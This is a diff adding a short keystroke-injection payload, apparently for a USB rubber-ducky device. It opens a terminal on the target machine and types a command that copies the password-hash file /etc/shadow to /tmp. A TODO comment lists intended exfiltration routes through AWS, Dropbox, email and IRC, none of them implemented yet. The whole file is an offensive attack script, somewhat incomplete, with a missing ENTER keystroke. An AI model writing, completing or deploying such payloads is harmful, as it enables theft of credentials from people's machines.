@@ -1,0 +1,9 @@
+REM Dumps network credentials and exfils them
+DEFAULT_DELAy 400
+CTRL ALT t
+STRING cp /etc/shadow /tmp/creds.txt
+REM To Do: Exfil creds
+REM   - AWS instance
+REM   - DropBox
+REM   - Email
+REM   - IRC
